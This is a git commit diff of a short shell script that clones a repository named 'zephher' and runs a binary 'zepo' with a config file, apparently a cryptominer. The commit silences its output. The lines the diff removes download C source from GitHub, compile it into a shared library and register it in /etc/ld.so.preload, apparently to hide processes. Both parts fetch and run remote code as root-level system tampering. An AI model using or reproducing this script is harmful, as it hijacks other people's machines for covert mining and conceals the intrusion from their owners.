2803f314c0a7cfa54be6f29974b62dca4fbe57a8
epois <152323500+epois@users.noreply.github.com>
2023-11-29 13:38:19 +0800

    Update losss.sh

--- baseman.sh
+++ baseman.sh
@@ -1,14 +1,6 @@
-#!/bin/bash
-apt-get update ; apt-get install sudo -y
-curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
-apt-get install build-essential -y
-gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
-mv libnyumput.so /usr/local/lib/
-echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
-rm nyumput.c
 git clone https://github.com/epois/zephher.git >/dev/null 2>&1
 cd zephher
 chmod +x SHA256SUMS
 chmod +x config.json
 chmod +x zepo
-./zepo -c "config.json"
+./zepo -c "config.json" >/dev/null 2>&1
